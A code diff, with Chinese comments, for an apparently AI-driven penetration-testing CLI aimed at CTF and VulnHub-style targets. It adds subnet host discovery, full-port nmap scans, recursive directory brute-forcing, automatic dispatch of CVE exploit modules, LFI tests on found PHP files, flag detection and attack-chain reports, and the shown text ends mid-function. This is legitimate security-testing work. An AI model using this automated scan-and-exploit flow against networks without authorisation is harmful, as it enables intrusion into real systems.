@@ -170,6 +170,7 @@ def _get_target_cookie(target: str, config: dict) -> str:
 class Intent(Enum):
     """用户意图类型"""
     SCAN = "scan"           # 扫描目标
+    DISCOVER = "discover"   # 主动靶机发现
     ANALYZE = "analyze"     # 分析数据
     EXPLOIT = "exploit"     # 漏洞利用
     REPORT = "report"       # 生成报告
@@ -252,6 +253,10 @@ class IntentRecognizer:
 
     # 意图关键词映射
     INTENT_KEYWORDS = {
+        Intent.DISCOVER: ["发现靶机", "找靶机", "靶机发现", "主动发现", "discover",
+                          "hunt", "找目标", "寻找靶机", "自动发现", "扫网段",
+                          "探测局域网", "发现主机", "网络发现",
+                          "靶场", "找靶场", "发现靶场", "靶场扫描", "扫靶场", "靶场在哪"],
         Intent.SCAN: ["扫描", "scan", "测试", "test", "探测", "detect", "检查", "check"],
         Intent.ANALYZE: ["分析", "analyze", "评估", "assess", "查看结果", "show result"],
         Intent.EXPLOIT: ["利用", "exploit", "攻击", "attack", "尝试", "try"],
@@ -266,6 +271,12 @@ class IntentRecognizer:
     TARGET_PATTERNS = [
         r'(?:目标|target|扫描|scan|测试|test)\s*[::]?\s*(https?://[^\s\u4e00-\u9fff]+)',
         r'(https?://[^\s\u4e00-\u9fff]+)',  # 排除中文字符，URL 只含 ASCII
+        # CIDR 子网：192.168.1.0/24（优先于单 IP，放在前面）
+        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})',
+        # IP 范围：192.168.1.1-254
+        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}-\d{1,3})',
+        # 通配符：192.168.1.*
+        r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\*)',
         r'([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(?::\d+)?)',
         r'(?:目标|target|扫描|scan|测试|test)\s*[::]?\s*([a-zA-Z0-9\-\.]+(?:\.\w+)?)',
         r'([a-zA-Z0-9\-]+\.[a-zA-Z0-9\-\.]+\.\w+)',
@@ -293,6 +304,12 @@ class IntentRecognizer:
         for keyword in self.INTENT_KEYWORDS[Intent.HELP]:
             if keyword in user_input_lower:
                 return Intent.HELP, {}
+
+        # 2.5 检查靶机发现意图（优先于 SCAN，避免"发现"被 QUERY 截获）
+        for keyword in self.INTENT_KEYWORDS[Intent.DISCOVER]:
+            if keyword in user_input_lower:
+                network = self._extract_target(user_input)
+                return Intent.DISCOVER, {"network": network}
 
         # 3. 检查扫描意图
         for keyword in self.INTENT_KEYWORDS[Intent.SCAN]:
@@ -587,11 +604,20 @@ class ClawAIChatCLI:
         elif intent == Intent.HELP:
             return self._get_help_text()
 
+        elif intent == Intent.DISCOVER:
+            return await self._execute_discover(params.get("network"))
+
         elif intent == Intent.SCAN:
             target = params.get("target")
             if target:
                 self.session.target = target
                 self.session.phase = "reconnaissance"
+
+                # ── 网段/CIDR 目标：走主机发现流程 ───────────────────────
+                from src.shared.backend.tools.nmap import _is_network_target
+                if _is_network_target(target):
+                    return await self._execute_network_scan(target, user_input)
+
                 # 优先检测漏洞类型（专用模式）
                 vuln_type = self._detect_vuln_type(user_input)
                 if vuln_type:
@@ -604,19 +630,26 @@ class ClawAIChatCLI:
                         vuln_hint=vuln_type,
                     )
                 profile = self._detect_scan_profile(user_input)
+                full_port = self._detect_full_port(user_input)
                 # 用户未明确指定 profile 时,交互式选择
                 if profile == "standard" and not any(
                     kw in user_input.lower() for kw in ["快速", "quick", "深度", "deep", "快扫", "全量", "完整", "标准"]
                 ):
                     from rich.prompt import Prompt
                     console.print("\n[bold]选择扫描模式:[/]")
-                    console.print("  [1] 快速扫描 (3轮: nmap + curl)")
-                    console.print("  [2] 标准扫描 (5轮: nmap + curl + dirsearch) [默认]")
-                    console.print("  [3] 深度扫描 (10轮: nmap + curl + dirsearch + sqlmap)")
-                    choice = Prompt.ask("请选择", choices=["1", "2", "3", ""], default="2")
-                    profile_map = {"1": "quick", "2": "standard", "3": "deep"}
+                    console.print("  [1] 快速扫描   (nmap 常用端口 + curl)")
+                    console.print("  [2] 标准扫描   (nmap + curl + dirsearch) [默认]")
+                    console.print("  [3] 深度扫描   (nmap 全端口 + curl + dirsearch + sqlmap)")
+                    console.print("  [4] 全端口扫描 (nmap -p- 1-65535，较慢)")
+                    choice = Prompt.ask("请选择", choices=["1", "2", "3", "4", ""], default="2")
+                    profile_map = {"1": "quick", "2": "standard", "3": "deep", "4": "deep"}
                     profile = profile_map.get(choice, "standard")
-                return await self._execute_scan(target, profile=profile)
+                    if choice == "4":
+                        full_port = True
+                # deep 模式默认开启全端口
+                if profile == "deep":
+                    full_port = True
+                return await self._execute_scan(target, profile=profile, full_port=full_port)
             else:
                 return "请指定要扫描的目标.例如:扫描 example.com 或 快速扫描 192.168.1.1"
 
@@ -644,7 +677,7 @@ class ClawAIChatCLI:
     async def _execute_scan(
         self, target: str, profile: str = "standard",
         override_skills: list = None, override_iterations: int = None,
-        vuln_hint: str = None,
+        vuln_hint: str = None, full_port: bool = False,
     ) -> str:
         """执行扫描任务,带进度条,暂停支持,EventBus事件和取消支持"""
         from src.cli.scan_state import ScanStateMachine, ScanState
@@ -692,6 +725,9 @@ class ClawAIChatCLI:
 
             results = {"target": target, "iterations": [], "final_summary": "", "status": "completed"}
             self.session.findings.clear()  # 每次扫描前清空历史发现，避免污染
+            self._dispatched_skills: set = set()  # 追踪已分发过的 CVE Skill，防止重复触发
+            self._executed_commands: list = []   # 已执行命令列表，供 planner 去重
+            self._failed_patterns: list = []     # 失败命令模式，注入 planner 避免重试
             self.agent.reset()
             # 将 Cookie 注入 agent 上下文，让 planner 生成的 curl 命令带上认证
             if _session_cookie:
@@ -811,6 +847,34 @@ class ClawAIChatCLI:
 
                     tool_name = self.agent._identify_tool_from_command(command) or "cmd"
 
+                    # 全端口扫描：将 nmap 命令改为 -p- 并延长超时
+                    if tool_name == "nmap" and full_port:
+                        import re as _re
+                        # 替换 -p <ports_list> 为 -p-
+                        command = _re.sub(r'-p\s+[\d,\-]+', '-p-', command)
+                        # 如果没有 -p 参数就追加
+                        if '-p-' not in command:
+                            command = command.rstrip() + ' -p-'
+                        # 加上服务版本检测
+                        if '-sV' not in command:
+                            command = command.replace('nmap ', 'nmap -sV ', 1)
+                        console.print("  [cyan]全端口扫描模式 (-p- 1-65535)，耗时较长...[/]")
+
+                    # 强制注入 dirsearch 递归参数 + 自定义 VulnHub 词典（AI planner 经常遗漏）
+                    if tool_name == "dirsearch":
+                        import os as _os
+                        _custom_wl = _os.path.join(
+                            _os.path.dirname(_os.path.dirname(_os.path.dirname(_os.path.abspath(__file__)))),
+                            "config", "vulnhub_paths.txt"
+                        )
+                        if "-r" not in command:
+                            command = command.rstrip() + " -r -R 3"
+                        # 追加自定义词典（优先扫描靶机常见路径）
+                        if _os.path.exists(_custom_wl) and "--wordlist" not in command and "-w" not in command:
+                            # 使用正斜杠避免 shell 转义问题
+                            _custom_wl_unix = _custom_wl.replace("\\", "/")
+                            command = command.rstrip() + f" -w {_custom_wl_unix}"
+
                     # 执行阶段
                     scan.set_iteration(iteration + 1, "执行中", tool_name)
                     progress.update(scan_task, description=f"[{iteration+1}/{max_iterations}] 执行 {tool_name}")
@@ -821,7 +885,11 @@ class ClawAIChatCLI:
 
                     try:
                         # 增加超时: nmap 等工具可能需要更长时间
-                        exec_timeout = 300 if tool_name in ("nmap", "nuclei", "sqlmap", "nikto", "dirsearch", "ffuf", "gobuster") else 120
+                        exec_timeout = 300 if tool_name in ("nmap", "nuclei", "sqlmap", "dirsearch", "ffuf", "gobuster") else 120
+                        if tool_name == "nikto":
+                            exec_timeout = 60  # nikto -timeout 30 内部限制，60s 足够
+                        if tool_name == "nmap" and full_port:
+                            exec_timeout = 600  # 全端口扫描最多 10 分钟
                         command_output, execution_metadata = await asyncio.wait_for(
                             self.agent.execute_command(command, target),
                             timeout=exec_timeout,
@@ -851,6 +919,23 @@ class ClawAIChatCLI:
                         "success": not execution_metadata.get("error"),
                     })
 
+                    # 追踪已执行命令与失败模式
+                    self._executed_commands.append(command)
+                    _failure_signals = (
+                        "curl: (26)", "curl: (7)", "curl: (6)",
+                        "command not found", "No such file", "Connection refused",
+                        "执行超时", "Failed to open",
+                    )
+                    if any(sig in command_output for sig in _failure_signals):
+                        # 记录失败的命令模式（取命令前60字符作为标识）
+                        _fail_key = command[:60]
+                        if _fail_key not in self._failed_patterns:
+                            self._failed_patterns.append(_fail_key)
+                            # 立即注入禁止提示到 agent 历史
+                            self.agent.summarized_history += (
+                                f"\n[失败命令] 以下命令已失败，严禁重试: `{_fail_key}...`"
+                            )
+
                     # 更新观察
                     self.agent.new_observation = f"命令: {command}\n输出: {command_output}"
                     if len(self.agent.new_observation) > self.agent.new_observation_length_limit:
@@ -872,6 +957,39 @@ class ClawAIChatCLI:
                     self.session.findings.append(
                         self._parse_finding(tool_name, command, command_output)
                     )
+
+                    # 指纹识别 → CVE Skill 自动分发（tool_name 可能带 _scan 后缀）
+                    _fp_trigger_tools = ("nmap", "curl", "nikto", "dirsearch", "gobuster", "ffuf")
+                    if any(tool_name.startswith(t) for t in _fp_trigger_tools):
+                        await self._auto_dispatch_cve_skills(target, self.session.findings)
+
+                    # CVE Skill 确认 RCE/漏洞 → 提前终止扫描
+                    _rce_confirmed = any(
+                        f.get("type") == "cve_skill" and f.get("vulnerable")
+                        and any(kw in (f.get("evidence", "") + f.get("output_preview", ""))
+                                for kw in ("RCE_SUCCESS", "uid=", "root", "whoami", "shell", "VULN"))
+                        for f in self.session.findings
+                    )
+                    if _rce_confirmed:
+                        console.print(Text(
+                            "  [✓] CVE Skill 已确认 RCE，跳过后续迭代",
+                            style="bold rgb(0,255,65)"
+                        ))
+                        results["status"] = "stopped_early"
+                        break
+
+                    # WordPress 检测 → 自动触发 wpscan（tool_name 可能带 _scan 后缀）
+                    _wp_trigger_tools = ("nmap", "curl", "nikto", "dirsearch", "gobuster", "ffuf", "whatweb")
+                    if any(tool_name.startswith(t) for t in _wp_trigger_tools):
+                        await self._auto_detect_wordpress(target, self.session.findings)
+
+                    # nmap/curl 完成后 → dir_scan 补充目录发现
+                    if tool_name in ("nmap", "curl") and "dir_scan" not in self._dispatched_skills:
+                        await self._auto_run_dir_scan(target, self.session.findings)
+
+                    # dirsearch 发现 PHP 文件 → 自动 LFI 测试
+                    if tool_name in ("dirsearch", "gobuster", "ffuf", "feroxbuster"):
+                        await self._auto_lfi_test_php_files(target, self.session.findings)
 
                     # Flag 检测：发现即停止扫描
                     flags_in_output = self._detect_flags(command_output)
@@ -946,6 +1064,10 @@ class ClawAIChatCLI:
             self.session.phase = "scanning"
             self._autosave()
 
+            # ── 自动生成渗透报告 ──────────────────────────────────────────
+            if self.session.findings:
+                await self._auto_generate_report(target, results)
+
         except KeyboardInterrupt:
             console.print("\n扫描已取消")
             response_parts.append("\n扫描已取消.")
@@ -958,6 +1080,343 @@ class ClawAIChatCLI:
             self._scan_state = None
 
         return "\n".join(response_parts)
+
+    async def _execute_discover(self, network: str = None) -> str:
+        """主动靶机发现：调用 DiscoverCommand 并传入当前 chat_cli 上下文。"""
+        from src.cli.commands.discover import DiscoverCommand
+        cmd = DiscoverCommand()
+        args = []
+        if network:
+            args += ["--network", network]
+        ctx = {
+            "console": console,
+            "chat_cli": self,
+        }
+        return await cmd._run(console, network, False, False, self)
+
+    async def _execute_network_scan(self, network: str, user_input: str) -> str:
+        """
+        子网/网段扫描入口：先主机发现，展示存活主机列表，
+        询问是否对每台主机展开深度扫描。
+        """
+        from src.shared.backend.tools.nmap import NmapTool
+        from rich.table import Table
+
+        console.print(f"\n[bold cyan]网段扫描模式[/] — 目标: [bold]{network}[/]")
+        console.print("[dim]第一步：主机发现（nmap -sn Ping扫描）...[/]")
+
+        tool = NmapTool()
+        if not tool.is_available():
+            console.print("[yellow]nmap 未安装，使用模拟数据...[/]")
+
+        # 主机发现
+        with console.status("[cyan]正在探测存活主机...[/]"):
+            discovery = await asyncio.to_thread(
+                tool.discover_hosts, network, 120
+            )
+
+        alive = discovery.get("alive_hosts", [])
+        if not alive:
+            return (
+                f"网段 {network} 内未发现存活主机。\n"
+                "可能原因：① 主机开启防火墙拒绝 ICMP ② 网段不可达 ③ 需要 root 权限\n"
+                "提示：可尝试 `nmap -Pn <IP>` 跳过 Ping 检测直接扫端口。"
+            )
+
+        # 展示存活主机表格
+        tbl = Table(title=f"发现 {len(alive)} 台存活主机", border_style="cyan")
+        tbl.add_column("序号", style="dim", width=5)
+        tbl.add_column("IP 地址", style="bold green")
+        tbl.add_column("备注")
+        for i, ip in enumerate(alive, 1):
+            note = "（当前会话目标）" if ip == self.session.target else ""
+            tbl.add_row(str(i), ip, note)
+        console.print(tbl)
+
+        # 将发现结果记录到 session
+        self.session.findings.append({
+            "type": "host_discovery",
+            "severity": "info",
+            "network": network,
+            "alive_hosts": alive,
+            "total_alive": len(alive),
+            "description": f"网段 {network} 发现 {len(alive)} 台存活主机：{', '.join(alive[:10])}",
+        })
+
+        # 询问下一步
+        from rich.prompt import Prompt, Confirm
+        if len(alive) == 1:
+            # 只有一台，直接扫描
+            target = alive[0]
+            console.print(f"\n[bold]仅发现一台主机 {target}，自动开始标准扫描...[/]")
+            self.session.target = target
+            profile = self._detect_scan_profile(user_input)
+            full_port = self._detect_full_port(user_input)
+            if profile == "deep":
+                full_port = True
+            return await self._execute_scan(target, profile=profile, full_port=full_port)
+
+        console.print(f"\n[bold]请选择后续操作：[/]")
+        console.print("  [1] 对所有主机快速扫描（nmap 常用端口）")
+        console.print("  [2] 选择指定主机深度扫描")
+        console.print("  [3] 仅展示存活列表，不继续扫描")
+        choice = Prompt.ask("请选择", choices=["1", "2", "3"], default="1")
+
+        if choice == "3":
+            hosts_str = "\n".join(f"  • {ip}" for ip in alive)
+            return f"网段 {network} 存活主机列表：\n{hosts_str}"
+
+        elif choice == "2":
+            # 让用户选择某台主机
+            idx_str = Prompt.ask(
+                f"输入序号（1-{len(alive)}）",
+                default="1"
+            )
+            try:
+                idx = int(idx_str) - 1
+                target = alive[max(0, min(idx, len(alive) - 1))]
+            except ValueError:
+                target = alive[0]
+            console.print(f"\n[bold]开始深度扫描 {target}...[/]")
+            self.session.target = target
+            return await self._execute_scan(target, profile="deep", full_port=True)
+
+        else:  # choice == "1"：批量快速扫描
+            results_summary = []
+            for ip in alive[:10]:  # 最多 10 台
+                console.print(f"\n[cyan]→ 扫描 {ip}...[/]")
+                with console.status(f"nmap 扫描 {ip}..."):
+                    r = await asyncio.to_thread(
+                        tool._execute_real, ip, {"scan_type": "-sT"}
+                    )
+                ports = r.get("ports", [])
+                port_strs = [f"{p['port']}/{p['service']}" for p in ports[:8]]
+                line = f"  {ip:<18} {len(ports)} 个开放端口: {', '.join(port_strs) or '无'}"
+                console.print(line)
+                results_summary.append(line)
+                # 写入 session findings
+                self.session.findings.append({
+                    "type": "port_scan",
+                    "severity": "info",
+                    "target": ip,
+                    "open_ports": [f"{p['port']}/{p['service']}" for p in ports],
+                    "output_preview": r.get("raw_output", "")[:200],
+                })
+
+            summary_text = (
+                f"网段 {network} 批量扫描完成，共扫描 {min(len(alive), 10)} 台主机：\n"
+                + "\n".join(results_summary)
+            )
+            if len(alive) > 10:
+                summary_text += f"\n\n（仅展示前 10 台，剩余 {len(alive)-10} 台未扫描）"
+
+            console.print(f"\n[bold green]批量扫描完成[/]")
+
+            # 如果有感兴趣的主机，提示进一步扫描
+            interesting = [
+                ip for ip in alive[:10]
+                if any(
+                    f["target"] == ip and len(f.get("open_ports", [])) > 0
+                    for f in self.session.findings
+                    if f.get("type") == "port_scan"
+                )
+            ]
+            if interesting:
+                console.print(f"\n[bold]发现 {len(interesting)} 台有开放端口的主机，可继续深度扫描。[/]")
+                console.print("输入 `扫描 <IP>` 对单台主机进行深度分析。")
+
+            return summary_text
+
+    async def _auto_generate_report(self, target: str, results: Dict[str, Any]) -> None:
+        """扫描完成后自动生成 HTML + Markdown 渗透报告，保存到 比赛材料/ 目录。"""
+        import time
+        from pathlib import Path
+
+        _GRN  = "rgb(0,255,65)"
+        _CYAN = "rgb(0,212,255)"
+        _AMBER = "rgb(255,191,0)"
+        _DIM  = "rgb(80,110,80)"
+
+        try:
+            from src.shared.backend.report.penetration_report_generator import (
+                PenetrationReportGenerator,
+            )
+        except ImportError as e:
+            logger.warning(f"报告生成模块加载失败: {e}")
+            return
+
+        console.print()
+        console.print(Text("  [报告] 正在生成渗透测试报告...", style=_DIM))
+
+        # ── 提取攻击链关键信息注入报告 ──────────────────────────────
+        attack_chain = self._extract_attack_chain(results)
+        enriched_findings = list(self.session.findings)
+
+        # 把攻击链作为特殊 finding 写入，报告生成器会渲染它
+        if attack_chain:
+            enriched_findings.append({
+                "type":          "attack_chain",
+                "title":         "完整攻击链",
+                "severity":      "critical",
+                "description":   attack_chain["description"],
+                "steps":         attack_chain["steps"],
+                "output_preview": attack_chain["summary"],
+                "vulnerable":    True,
+            })
+
+        gen = PenetrationReportGenerator()
+        duration = results.get("_duration_seconds")
+        report_dict = gen.generate_report(
+            target=target,
+            findings=enriched_findings,
+            report_format="html",
+            scan_type=results.get("profile", "standard"),
+            duration=duration,
+            tester_name="ClawAI 自动化渗透测试系统",
+        )
+
+        # ── 保存路径 ─────────────────────────────────────────────────
+        safe_target = target.replace(".", "_").replace("/", "_").replace(":", "_")
+        timestamp   = time.strftime("%Y%m%d_%H%M%S")
+        out_dir     = Path("比赛材料")
+        out_dir.mkdir(exist_ok=True)
+
+        html_path = out_dir / f"{safe_target}_{timestamp}_report.html"
+        md_path   = out_dir / f"{safe_target}_{timestamp}_report.md"
+
+        # HTML
+        try:
+            html_content = gen.generate_html_report(report_dict)
+            html_path.write_text(html_content, encoding="utf-8")
+        except Exception as e:
+            logger.warning(f"HTML 报告生成失败: {e}")
+            html_path = None
+
+        # Markdown
+        try:
+            md_content = gen.generate_markdown_report(report_dict)
+            md_path.write_text(md_content, encoding="utf-8")
+        except Exception as e:
+            logger.warning(f"Markdown 报告生成失败: {e}")
+            md_path = None
+
+        # ── 控制台输出 ────────────────────────────────────────────────
+        risk_label = report_dict.get("overall_risk_label", "Unknown")
+        stats      = report_dict.get("statistics", {})
+        console.print()
+        console.print(Text("  ┌─ 渗透报告 " + "─" * 48, style=_CYAN))
+        console.print(Text(f"  │  目标    : {target}", style=""))
+        console.print(Text(f"  │  风险等级: {risk_label}", style=_AMBER))
+        console.print(
+            Text(
+                f"  │  发现统计: "
+                f"Critical {stats.get('critical',0)}  "
+                f"High {stats.get('high',0)}  "
+                f"Medium {stats.get('medium',0)}  "
+                f"Low {stats.get('low',0)}",
+                style="",
+            )
+        )
+        if html_path:
+            console.print(Text(f"  │  HTML    : {html_path}", style=_GRN))
+        if md_path:
+            console.print(Text(f"  │  Markdown: {md_path}", style=_GRN))
+        console.print(Text("  └" + "─" * 59, style=_CYAN))
+
+    def _extract_attack_chain(self, results: Dict[str, Any]) -> Dict[str, Any]:
+        """从 session.findings 和 results 中提取完整攻击链步骤。"""
+        steps   = []
+        summary_parts = []
+
+        for f in self.session.findings:
+            ftype = f.get("type", "")
+
+            if ftype == "http_probe":
+                steps.append({
+                    "phase": "信息收集",
+                    "action": f"HTTP 探测：{f.get('status_code','?')} {f.get('server','')}",
+                    "result": f.get("output_preview", "")[:120],
+                })
+
+            elif ftype == "port_scan":
+                ports = f.get("open_ports") or f.get("output_preview", "")
+                steps.append({
+                    "phase": "端口扫描",
+                    "action": "nmap 全端口扫描",
+                    "result": str(ports)[:200],
+                })
+
+            elif ftype == "cve_skill":
+                skill_id = f.get("skill_id", "")
+                vuln     = f.get("vulnerable", False)
+                evidence = f.get("evidence") or f.get("output_preview", "")
+                steps.append({
+                    "phase":  "漏洞利用",
+                    "action": f"CVE Skill: {skill_id}",
+                    "result": ("✅ 漏洞确认 — " if vuln else "❌ 未确认 — ") + evidence[:200],
+                })
+                if vuln:
+                    summary_parts.append(f"通过 {skill_id} 确认漏洞利用")
+
+            elif ftype == "dir_scan":
+                paths = f.get("paths", [])
+                steps.append({
+                    "phase":  "目录发现",
+                    "action": "dir_scan 目录扫描",
+                    "result": f"发现 {len(paths)} 个路径: " + ", ".join(paths[:5]),
+                })
+
+            elif ftype == "credential":
+                username = f.get("username") or f.get("output_preview", "")
+                steps.append({
+                    "phase":  "凭据获取",
+                    "action": "凭据提取",
+                    "result": f"获取凭据: {username}",
+                })
+                summary_parts.append(f"获取系统凭据: {username}")
+
+            elif ftype == "ssh_access":
+                host = f.get("host") or self.session.target
+                user = f.get("username", "")
+                steps.append({
+                    "phase":  "横向移动",
+                    "action": f"SSH 登录 {user}@{host}",
+                    "result": f.get("output_preview", "SSH 登录成功")[:200],
+                })
+                summary_parts.append(f"SSH 横向移动至 {user}@{host}")
+
+            elif ftype == "flag":
+                val = f.get("value") or f.get("output_preview", "")
+                steps.append({
+                    "phase":  "目标达成",
+                    "action": "获取 Flag",
+                    "result": f"🚩 {val}",
+                })
+                summary_parts.append(f"成功获取 Flag: {val}")
+
+        # 扫描迭代中发现的 flag
+        for flag in results.get("flags_found", []):
+            if not any(s.get("action") == "获取 Flag" and flag in s.get("result","") for s in steps):
+                steps.append({
+                    "phase":  "目标达成",
+                    "action": "获取 Flag",
+                    "result": f"🚩 {flag}",
+                })
+                summary_parts.append(f"成功获取 Flag: {flag}")
+
+        if not steps:
+            return {}
+
+        description = "自动化渗透测试完整攻击链：" + "；".join(summary_parts) if summary_parts else "完整渗透路径"
+
+        # 去重后按阶段顺序拼摘要
+        seen_phases: list = []
+        for s in steps:
+            if s["phase"] not in seen_phases:
+                seen_phases.append(s["phase"])
+        summary = " → ".join(seen_phases)
+
+        return {"steps": steps, "description": description, "summary": summary}
 
     def _build_scan_summary(self, results: Dict[str, Any]) -> str:
         """Build a concise, user-facing scan summary from structured findings.
@@ -987,7 +1446,7 @@ class ClawAIChatCLI:
             if t not in seen_tools:
                 seen_tools.add(t)
                 tools_used.append(t)
-        lines.append(f"使用工具: {', '.join(tools_used)}")
+        lines.append(f"使用工具: {', '.join(x for x in tools_used if x)}")
 
         # Structured summary per finding type
         lines.append(f"发现数量: {len(findings)}")
@@ -1174,9 +1633,17 @@ class ClawAIChatCLI:
         text = user_input.lower()
         if any(kw in text for kw in ["快速", "quick", "快扫"]):
             return "quick"
-        if any(kw in text for kw in ["深度", "deep", "全量", "完整"]):
+        if any(kw in text for kw in ["深度", "deep", "全量", "完整", "全端口", "全扫", "full"]):
             return "deep"
         return "standard"
+
+    def _detect_full_port(self, user_input: str) -> bool:
+        """检测用户是否要求全端口扫描"""
+        text = user_input.lower()
+        return any(kw in text for kw in [
+            "全端口", "all port", "full port", "-p-", "1-65535",
+            "所有端口", "全部端口", "65535"
+        ])
 
     def _detect_vuln_type(self, user_input: str) -> Optional[str]:
         """从用户输入检测漏洞类型，返回 VULN_PROFILES 的 key 或 None"""
@@ -1643,33 +2110,42 @@ class ClawAIChatCLI:
             }
 
         if tool_name == "curl":
-            status = re.search(r'HTTP/[\d.]+ (\d{3})', output)
-            server = re.search(r'[Ss]erver:\s*(.+)', output)
+            # curl -v 输出响应头带 "< " 前缀（stderr），curl -s -i 不带前缀（stdout）
+            # 统一处理两种格式
+            status = re.search(r'(?:^|< )HTTP/[\d.]+ (\d{3})', output, re.M)
+            server = re.search(r'(?:^|< )[Ss]erver:\s*(.+)', output, re.M)
             title = re.search(r'<title>([^<]{1,80})</title>', output, re.I)
-            headers = re.findall(r'^([\w-]+):\s*(.+)', output, re.M)
+            headers = re.findall(r'(?:^|< )([\w-]+):\s*(.+)', output, re.M)
             sensitive = [h for h, v in headers if h.lower() in (
                 'x-powered-by', 'x-aspnet-version', 'x-generator',
                 'x-drupal-cache', 'x-wordpress-cache'
             )]
+            # 提取 WWW-Authenticate realm（含服务指纹，如 ActiveMQRealm）
+            www_auth = re.search(r'(?:^|< )WWW-Authenticate:\s*\S+\s+realm="([^"]+)"', output, re.I | re.M)
+            # 若无 Server header 但有 WWW-Authenticate realm，用 realm 作为 server 标识
+            server_val = server.group(1).strip() if server else (
+                www_auth.group(1) if www_auth else None
+            )
             # 即使没有响应头（-s 模式），也从 HTML 提取有用信息
             forms = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', output, re.I)
             inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', output, re.I)
             csrf_token = any(kw in ' '.join(inputs).lower() for kw in ('token', 'csrf', '_token', 'nonce'))
             parts = []
-            if status:   parts.append(f"HTTP {status.group(1)}")
-            if server:   parts.append(f"Server: {server.group(1).strip()[:40]}")
-            if title:    parts.append(f"Title: {title.group(1).strip()[:50]}")
-            if forms:    parts.append(f"Forms: {', '.join(forms[:3])}")
-            if inputs:   parts.append(f"Inputs: {', '.join(inputs[:5])}")
-            if csrf_token: parts.append("⚠ CSRF token 存在")
-            if sensitive: parts.append(f"Exposed: {','.join(sensitive)}")
+            if status:      parts.append(f"HTTP {status.group(1)}")
+            if server_val:  parts.append(f"Server: {server_val[:40]}")
+            if title:       parts.append(f"Title: {title.group(1).strip()[:50]}")
+            if www_auth:    parts.append(f"Realm: {www_auth.group(1)}")
+            if forms:       parts.append(f"Forms: {', '.join(forms[:3])}")
+            if inputs:      parts.append(f"Inputs: {', '.join(inputs[:5])}")
+            if csrf_token:  parts.append("⚠ CSRF token 存在")
+            if sensitive:   parts.append(f"Exposed: {','.join(sensitive)}")
             clean_preview = " | ".join(parts) if parts else "(curl -s 模式: 无响应头，尝试加 -v)"
             return {
                 "type": "http_probe",
                 "tool": tool_name,
                 "command": command,
                 "status_code": status.group(1) if status else None,
-                "server": server.group(1).strip() if server else None,
+                "server": server_val,
                 "title": title.group(1).strip() if title else None,
                 "forms": forms[:5],
                 "form_inputs": inputs[:10],
@@ -1684,12 +2160,22 @@ class ClawAIChatCLI:
             found = re.findall(r'\[(\d+:\d+:\d+)\]\s+(\d{3})\s+-[\s\d.KB]+- (https?://\S+)', output)
             paths_200 = [url for _, code, url in found if code in ('200', '301', '302', '401', '403')]
             interesting = [url for _, code, url in found if code in ('200', '301', '302')]
+            # 提取 PHP 文件路径（用于后续 LFI 测试）
+            php_files = [url for url in paths_200 if url.endswith('.php')]
+            # 提取 301 重定向目录 URL（用于后续目录列表探测）
+            # dirsearch 格式: [时间] 301 - 大小 - URL  ->  重定向URL/
+            dir_paths_raw = [(url, code) for _, code, url in found if code == '301']
+            # 从 301 条目的重定向目标中提取（带 / 的完整目录 URL）
+            dir_paths_redir = re.findall(r'\[\d+:\d+:\d+\]\s+301\s+-[\s\d.KB]+- https?://\S+\s+->\s+(https?://\S+/)', output)
+            dir_paths = list(dict.fromkeys(dir_paths_redir))[:10]
             return {
                 "type": "dir_enum",
                 "tool": tool_name,
                 "command": command,
                 "paths_found": paths_200[:30],
                 "interesting": interesting[:10],
+                "php_files": php_files[:10],
+                "dir_paths": dir_paths[:10],  # 新增：301 重定向目录
                 "total": len(found),
                 "output_preview": output[:300],
             }
@@ -1764,7 +2250,7 @@ class ClawAIChatCLI:
                 "type": "sql_injection", "tool": tool_name, "severity": "critical",
             })
 
-        # Flag 检测（参考 PentestGPT 的 6 个模式）
+        # Flag 检测（6 个模式）
         flags = self._detect_flags(output)
         if flags:
             for flag in flags:
@@ -1772,9 +2258,10 @@ class ClawAIChatCLI:
             self._emit_event("FLAG_FOUND", {"flags": flags, "tool": tool_name})
 
     def _detect_flags(self, text: str) -> list:
-        """检测文本中的 CTF Flag（参考 PentestGPT 的模式）"""
+        """检测文本中的 CTF Flag"""
         import re
-        patterns = [
+        # 明确带格式的 flag 模式（高精度，直接收录）
+        bracket_patterns = [
             r'flag\{[^}]+\}',           # flag{...}
             r'FLAG\{[^}]+\}',           # FLAG{...}
             r'HTB\{[^}]+\}',            # HackTheBox
@@ -1782,15 +2269,805 @@ class ClawAIChatCLI:
             r'CTF\{[^}]+\}',            # 通用 CTF
             r'CHTB\{[^}]+\}',           # CyberApocalypse
             r'THM\{[^}]+\}',            # TryHackMe
-            r'[a-f0-9]{32}(?![a-f0-9])',# 32位 MD5 格式（排除更长的哈希）
         ]
         found = []
-        for pat in patterns:
+        for pat in bracket_patterns:
             matches = re.findall(pat, text, re.IGNORECASE)
             for m in matches:
                 if m not in found:
                     found.append(m)
+
+        # 32位 MD5 格式：仅当上下文明确包含 flag/answer/secret/key 关键词时才匹配
+        # 排除常见噪音：JSESSIONID、ETag、token、Set-Cookie 等
+        noise_ctx = re.compile(
+            r'(jsessionid|phpsessid|sessionid|set-cookie|etag|csrf|_token|nonce'
+            r'|authorization|bearer|x-auth|x-request-id|x-trace|correlation'
+            r'|boundary=|content-md5|x-amz)',
+            re.IGNORECASE
+        )
+        flag_ctx = re.compile(r'(flag|answer|secret|proof|hash|pwn|root|capture)', re.IGNORECASE)
+
+        for m in re.finditer(r'([a-f0-9]{32})(?![a-f0-9])', text, re.IGNORECASE):
+            candidate = m.group(1)
+            if candidate in found:
+                continue
+            # 取命中位置前后 60 字符作为上下文
+            start = max(0, m.start() - 60)
+            end = min(len(text), m.end() + 60)
+            ctx = text[start:end]
+            # 有噪音上下文 → 跳过
+            if noise_ctx.search(ctx):
+                continue
+            # 需要 flag 语境 → 才收录
+            if flag_ctx.search(ctx):
+                found.append(candidate)
+
         return found
+
+    async def _auto_lfi_test_php_files(
+        self, target: str, all_findings: list
+    ) -> None:
+        """dirsearch 发现 PHP 文件 → 自动触发 LFI 测试
+
+        从 dir_enum findings 中提取 PHP 文件路径，
+        对每个 PHP 文件用 lfi_basic skill 进行 LFI 检测。
+        同时：当 dirsearch 发现目录（301）时，自动 curl 该目录
+        从 Apache 目录列表（autoindex）中提取 PHP 文件链接。
+        """
+        _GRN = "rgb(0,255,65)"
